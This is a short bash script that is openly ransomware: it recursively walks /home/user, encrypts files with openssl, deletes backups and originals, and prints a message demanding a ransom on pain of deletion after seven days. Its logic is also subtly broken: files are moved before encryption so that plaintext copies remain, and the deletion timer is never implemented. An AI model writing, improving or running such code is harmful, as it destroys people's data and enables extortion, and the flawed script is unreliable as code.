#!/bin/bash

# Define variables
extension=".encrypted"
backup_folder="/home/user/backups/"
days_until_deletion=7

# Function to encrypt files recursively
encrypt_files() {
    local path=$1
    local abs_path=$(realpath -L "$path")
    
    if [[ -d "$abs_path" ]]; then
        for file in "$abs_path"/*; do
            if [[ -f "$file" && ! -p "$file" && ! -c "$file" && ! -b "$file" && ! -d "$file" ]]; then
                encrypt_file "$file"
            elif [[ -d "$file" ]]; then
                encrypt_files "$file"
            fi
        done
    fi
}

# Function to encrypt a single file
encrypt_file() {
    local file=$1
    
    # Get the original filename without extension
    local base_name=$(basename "$file")    
    local new_name="${base_name%.*}$extension"

    # Rename the file and encrypt it
    mv -n "$file" "$new_name"
    openssl enc -aes-256-cbc -salt -in "$new_name" -out "$new_name".enc

    # Remove the backup if older than 'days_until_deletion' days
    if [[ -f "$backup_folder$base_name.enc" ]]; then
        rm -f "$backup_folder$base_name.enc"
    fi
    
    # Delete the original file after encryption
    rm -f "$file"

    echo "File '$base_name' has been encrypted to '$new_name'. Encrypted files will be deleted after $days_until_deletion days if you don't pay the ransom."
}

# Start encrypting files from root directory
encrypt_files "/home/user/"